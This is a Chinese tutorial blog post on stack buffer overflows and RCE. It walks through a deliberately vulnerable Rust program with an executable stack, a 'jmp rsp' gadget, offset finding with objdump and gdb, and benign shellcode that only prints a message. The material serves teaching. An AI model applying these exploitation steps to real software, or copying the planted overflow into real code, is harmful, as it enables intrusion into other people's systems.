RCE, DoS
========

> 這次的程式碼在 https://github.com/DanSnow/ironman-2019/tree/master/buffer-overflow

這篇的內容其實有點偏離主題了，不過因為也挺有趣的，所以再加上上一篇，我寫了兩篇來介紹，事實上這篇的內容還有本書叫「緩衝區溢位攻擊與防範」來討論這些內容，不知道各位有沒有聽過「[遠端程式執行漏洞 (Remote Code Executation, RCE)][rce-wiki]」，簡單來說就是讓你可以透過某些方法使得你可以在另一臺機器，或是另一個執行緒中執行任意的程式碼，那跟上一篇提到的 stack overflow 又有什麼關係呢？

[rce-wiki]: https://en.wikipedia.org/wiki/Arbitrary_code_execution

RCE
---

首先先讓我們來認識一下 RCE ，只要能在其它的處理緒中執行任意的程式碼都叫做 RCE ，如果你有看過類似的漏洞的報導的話，你可能會注意到現在大部份這類型的漏洞是由反序列化 (deserialize) 所引起的，但在以前由 buffer overflow 引起的可是不少喔

> 說到 RCE 我想到之前一個讓我印像挺深的 mysql 漏洞 [CVE-2016-6662][mysql-cve] ，這個漏洞的起因是可以用指令開啟 log 的功能與設定 log 輸出的位置，但這個位置也可以是 mysql 的設定檔，於是就可以寫入讓 mysql 載入其它 so 檔的設定

[mysql-cve]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6662

所以為什麼 buffer overflow 會引起 RCE ，這部份我們跟 DoS 一起講吧，首先 DoS 的中文是阻斷服務攻擊 (Denial of Service) ，意思是讓別人的服務停止運作，另外還有個名詞叫 DDoS 分散式阻斷服務攻擊，這一般是指用大量的流量讓別人的服務沒辦法正常運作，但這需要設法產生大量的流量才有辦法達到，如果說我僅僅是發送個特殊的資料過去對方的服務就能造成他的服務當機會發生什麼事，假如他們的服務正好有 buffer overflow 的問題，而你也能產生能造成這個問題的資料的話，還記得在前一篇中的 stack overflow 中，我們的程式直接執行到未預期的地方而當了嗎？

所謂的 buffer overflow 是程式用來暫存資料的空間寫入超過其大小的位置，這在 C 語言中其實還挺容易發生的，在 C 語言中像 `strcpy` 、 `strcat` 這類處理字串的 API 都沒有限制長度的參數，它們都是相信存在字串中結尾的 `\0` 當作中斷點，而不會去注意到存放字串的指標指向的空間是不是真的足夠，那如果這個 buffer 又是放在堆疊上的，那不就有機會引發 stack overflow 了嗎，只要讓對方的服務執行到異常的位置，那他的服務可能就會就此停止運作了

那 stack overflow 又要怎麼造成 RCE ，當能覆寫返回位置時，如果返回位置指向的是可以正常執行的指令會發生什麼事，程式會繼續執行下去，比如你知道對方的程式裡有某個位置執行的程式是清空硬碟的話，就把這個位置寫進去它的程式就會跳過去執行了，但這樣還是沒有達到執行任意程式的功能，說來以前的 CPU 可沒有指定哪段記憶體禁止執行程式的功能喔，如果我們寫入一個特殊的記憶體位置接下來則是想要執行的指令，只要那個記憶體位置執行的指令是跳到堆疊的位置去執行指令的話不就能執行剩下來放在堆疊上的指令了嗎？

我們來嘗試看看吧，先來準備基本的程式：

```rust
use std::{
  io::{self, Read},
  ptr,
};

extern "C" {
  pub fn jump_stack() -> !;
}

// 這個函式不該被執行到
fn use_jump_stack() {
  println!("This should not print");
  unsafe {
    jump_stack();
  }
}

fn buffer_overflow(b: &[u8]) {
  let mut buf = [0u8; 0];
  unsafe {
    // 這邊把讀進來的資料硬寫進一個長度為 0 的陣列，造成 stack overflow
    ptr::copy(b.as_ptr(), buf.as_mut_ptr(), b.len());
  }
}

fn main() {
  let mut buf = Vec::new();
  unsafe {
    // 設定 stack 為可執行的
    // 這用來解除防止 stack overflow 造成 RCE 的其中一個保護機制
    libc::mprotect(
        (&mut buf as *mut _ as usize & (-libc::sysconf(libc::_SC_PAGE_SIZE) as usize))
            as *mut libc::c_void,
        4096,
        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
    );
  }
  // 從標準輸入讀進資料，模擬由外部讀入的資料造成 RCE
  io::stdin().read_to_end(&mut buf).unwrap();
  buffer_overflow(&buf);
  // 使用一下 jump_stack ，不然不會被連結進來
  use_jump_stack();
}
```

其中 `jump_stack` 是一段用組語寫成的程式，它只有一個用途，就是跳到 stack 上執行：

```asm
.intel_syntax noprefix
.global jump_stack
jump_stack:
  jmp rsp
```

一般來說應該要在程式本身或會用到的動態函式庫來找看看有沒有 `jmp rsp` 這個指令的，不過因為這邊是示範，所以我們就自己寫一個在程式裡了

接下來為了產生能夠造成 RCE 的輸入資料，我們需要知道兩個東西，第一個是 `jmp rsp` 這個指令的記憶體位置，第二個是會造成 overflow 的 buffer 在 stack 中的位置距離返回位置有多遠，為了示範的方便，我們直接用 `objdump` 與 `gdb` 來看答案吧

> 以下記憶體位置可能會因為系統與編譯器版本影響而有所不同，如果要自己做請務必自己重新找過位置

先用 objdump 找出 `jump_stack` 的偏移位置：

```shell
$ objdump -M intel -d <exe path>
...
00000000000065d5 <jump_stack>:
    65d5:	ff e4                	jmp    rsp
    65d7:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
    65de:	00 00
...
```

因為輸出會很長，我會建議你用 `objdump -M intel -d <exe path> > <output file>` 這樣的方式輸出到檔案再慢慢找

這邊的 `65d5` 就是我們要的偏移位置，這個位置再加上程式碼載入到記憶體中的起始位置就是實際位置了

再來我們再用 `gdb` 來找與返回位置的距離與程式碼載入的起始位置，先準備一個輸入檔，檔案內容先隨意，我們先打開 gdb ：

```shell
$ gdb <執行檔位置>
>>> b buffer_overflow
>>> r < <輸入檔位置>
```

接著輸入 `b buffer_overflow` 與 `r < <輸入檔位置>`，程式將會執行起來並在 `buffer_overflow` 的函式暫停，這時開始輸入 `ni` 讓 gdb 單步執行，你並不需要每次都輸入 `ni` ，如果你直接按 Enter 的話 `gdb` 會自動重覆上一次的指令，所以只要一開始輸入就好，我們需要執行直到找到 `call ... <core::slice::<impl [T]>::as_mut_ptr>` 也就是呼叫 `as_mut_ptr` 的時候，那句組語的前一行大概會是像這樣的：

```plain
0x0000555555559e46  demo::buffer_overflow+38 lea    rdi,[rsp+0x37]
0x0000555555559e4b  demo::buffer_overflow+43 call   0x5555555594e0 <core::slice::<impl [T]>::as_mut_ptr>
```

這邊的 `lea` 指令是在把 `buf` 的位置存到 `rdi` 準備當 `as_mut_ptr` 的參數，可以看到它的位置是 `rsp + 0x37` 先繼續單步執行下去，找到像這樣的指令

```plain
0x0000555555559e7d  demo::buffer_overflow+93 add    rsp,0x38
```

這邊是在把使用到的堆疊空間還回去，所以它用了 `0x38` 的空間，對照上面的就可以知道 `buf` 的位置只差返回位置 1 個 byte 的空間而已，接著輸入 `info proc mappings`

```plain
>>> info proc mappings
process 28965
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555554000     0x555555589000    0x35000        0x0 demo
 ...
```

這邊就可以看到程式開始的位置是 `0x555555554000`，事實上這就是 proc 下的 `maps` 的檔案內容，所以從那邊看也行，把開始位置加上之前的偏移得到的是 `0x55555555a5d5`，到這邊我們需要的資訊都有了，所以我們開頭要覆寫的內容就是 1 個 byte 的值，再加上我們要的返回位置，用 16 進位表示會是：

```plain
0x00 0xd5 0xa5 0x55 0x55 0x55 0x55 0x00 0x00
```

這個我們先把它存成叫 `header` 的檔案備用，你可能會想問為什麼位置反過來了，因為目前大多的電腦用的是 little endian ，這之後可以再來講，再來要準備我們想執行的程式碼，這邊要用組語寫：

```asm
.intel_syntax noprefix
jmp start # 因為我們把訊息跟程式混在一起，所以要跳過訊息，不然會被當成程式執行
msg: .ascii "Hello from shellcode\n"
start:
# 計算訊息的位置，是用程式目前執行的位置減去訊息的長度與指令本身的長度
lea rsi, [rip - 28]
mov rax, 1 # write
mov rdi, 1 # 標準輸出
mov rdx, 21 # 訊息長度
syscall
mov rax, 60 # exit
mov rdi, 0
syscall
```

計算訊息位置那邊如果有不是自己手算的更好的寫法歡迎留言告訴我，然後我們把這個檔案存成 `shellcode.s` 後它編譯成機器碼：

```shell
$ as -o shellcode.o shellcode.s # 組譯
$ objcopy -O binary shellcode.o shellcode # 取出機器碼的部份
$ cat header shellcode > input # 把檔案組合成 input
$
```

再來把 `gdb` 重開，我們用剛剛的輸入檔重跑一次看看，這次不用加中斷點了，直接輸入 `r < input` 來執行：

```plain
>>> r < input
Hello from shellcode
```

我們的訊息印出來啦，那如果不要在 `gdb` 中執行呢？你可以自己試試看，因為這篇有點太長了，我們下集待續
